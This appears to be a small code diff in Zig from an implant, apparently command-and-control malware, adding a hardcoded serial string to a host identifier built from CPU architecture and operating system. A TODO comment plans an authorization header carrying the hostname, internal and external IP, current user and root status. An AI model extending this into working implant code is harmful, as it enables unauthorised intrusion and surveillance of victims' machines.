@@ -75,12 +75,15 @@ pub const State = struct {
     fn getImplantIdentity(allocator: std.mem.Allocator) ![]u8 {
         const arch_name = @tagName(@import("builtin").cpu.arch);
         const os_release = @tagName(@import("builtin").os.tag);
+        const serial_number = "Dbepb4bB";
 
         // TODO: Authorization: base64(ipid=arch:OS:hostname:internalIP:externalIP:currentUser:isRoot)
         const implant_id = try std.mem.join(allocator, "", &.{
             arch_name,
             ":",
             os_release,
+            ":",
+            serial_number,
         });
 
         return implant_id;
